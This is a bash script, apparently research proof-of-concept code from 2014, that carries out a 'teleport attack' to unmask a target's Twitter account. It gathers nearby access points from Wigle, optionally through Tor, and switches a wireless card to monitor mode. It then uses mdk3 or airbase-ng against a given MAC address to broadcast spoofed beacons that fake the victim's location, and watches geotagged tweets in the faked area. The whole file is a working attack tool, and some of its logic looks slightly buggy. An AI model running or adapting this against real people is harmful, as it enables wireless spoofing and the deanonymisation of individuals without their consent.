#!/bin/bash

# This script performs the full teleport attack to get someone's twitter account
# Written by Célestin Matte @ citi, Inria, 2014
# arg1 = latitude
# arg2 = longitude
# arg3 = mac address of the target
# You can configure this script in config.sh

if [ "$#" -ne 3 ]
then
    echo "Usage : $0 <lat> <long> <target_mac>";
    exit;
fi

############## Configs and options handling

if [ -f ./config.sh ]
then
    . ./config.sh
else
    echo "File config.sh not found. Please copy config.sh.example and provide all required information (cf. README.md)"
    exit;
fi

if [ "$api_key" == "" ]
then
    echo "You must provide a Google API key for the script to work. Please read the documentation."
    exit;
fi

if [ "$use_tor" -eq 1 ]
then
    echo "Using Tor"
    torify="torify"
else
    echo "Not using Tor"
    torify=""
fi

if [ "$cookie" == "" ]
then
    use_cookie=""
else
    echo "Using custom cookie"
    use_cookie="-c $cookie"
fi

if [ "$precision_wigle" == "" ]
then
    use_precision_wigle=""
else
    echo "Using $precision_wigle as a custom precision for Wigle"
    use_cookie="-p $precision_wigle"
fi

if [ "$use" == "mdk3" ]
then
    use_mdk3="-m"
else
    use_mdk3=""
fi

ifconfig -a | grep "$interface" >/dev/null
if [ "$?" -ne 0 ]
then
    echo "Error: interface \"$interface\" does not exist"
    exit;
fi

target_mac="$3";

tmpfile=$(mktemp)
tmpfile2=$(mktemp)
tmpfile3=$(mktemp)

# Proper exit on ^C
trap "kill 0" EXIT

############## Main script

echo "Getting a list of APs close to the provided location from Wigle..."
$torify ./get_ssid_list.pl $use_cookie $use_precision_wigle $use_mdk3 "$1" "$2" > $tmpfile
if [ $? -ne 0 ]
then
    exit;
fi
nb_aps=$(cat $tmpfile | wc -l)
echo "Got $nb_aps APs"

if [ "$check_AP" -eq 1 ]
then
    echo "Checking that obtained APs exist in Google's database"
    $torify ./filter_ap_list.sh $tmpfile > $tmpfile2
    nb_aps_filtered=$(cat $tmpfile2 | wc -l)
    echo "$nb_aps_filtered APs remaining"
else
    cp $tmpfile $tmpfile2
fi

echo "Getting a list of currently visible APs..."
echo "We need to be root for this"
# Note : useless with mdk3
sudo ifconfig "$interface" down \
  && sudo iwconfig "$interface" mode managed \
  && sudo ifconfig "$interface" up
./get_current_ssid.pl $use_mdk3 "$interface" >> $tmpfile2
nb_visible_aps=$(echo $(cat $tmpfile | wc -l) "-$nb_aps" | bc)
echo "Got $nb_visible_aps new APs."
if [ "$nb_visible_aps" -gt "$nb_aps" ]
then
    echo "********************* Warning ********************"	>&2
    echo "Got less access points than visible access points."	>&2
    echo "Chances are that the attack won't work"		>&2
    echo "**************************************************"	>&2
fi
sudo ifconfig "$interface" down \
  && sudo iwconfig "$interface" mode monitor \
  && sudo ifconfig "$interface" up
if [ $? -ne 0 ]
then
    echo "Failed to put interface $interface in monitor mode. Check that no network-handling software is running (e.g. network-manager, ifplugd...)"
    exit;
fi
echo "Checking the precise location that we should get from Google API..."
./convert_to_google_api.pl $use_mdk3 $tmpfile2 > $tmpfile3
res=$(curl -d @$tmpfile3 -H "Content-Type: application/json" -i "https://www.googleapis.com/geolocation/v1/geolocate?key=$api_key" 2>/dev/null)

# echo -n "Now, open another terminal and launch: php filter-track-geo.php "
echo -n "Launching Twitter monitoring "
lat=$(echo $res | sed -r 's/.*"lat": (-?[0-9\.]+).*/\1/')
long=$(echo $res | sed -r 's/.*"lng": (-?[0-9\.]+).*/\1/')
echo "(Estimated coordinates: $lat $long, with precision $precision)"

php filter-track-geo.php $(echo $lat-$precision | bc) $(echo $long-$precision | bc) $(echo $lat+$precision | bc) $(echo $long+$precision | bc) &

if [ "$use" == "mdk3" ]
then
    echo -e "\nLaunching the attack with mdk3 and the list of APs."
    sudo mdk3 "$interface" b -v $tmpfile2 -g -t >/dev/null
else
    echo -e "\nLaunching the attack with aircrack-ng and the list of APs."
    sudo airbase-ng -m $tmpfile2 -p -X -d $target_mac wlan0
fi
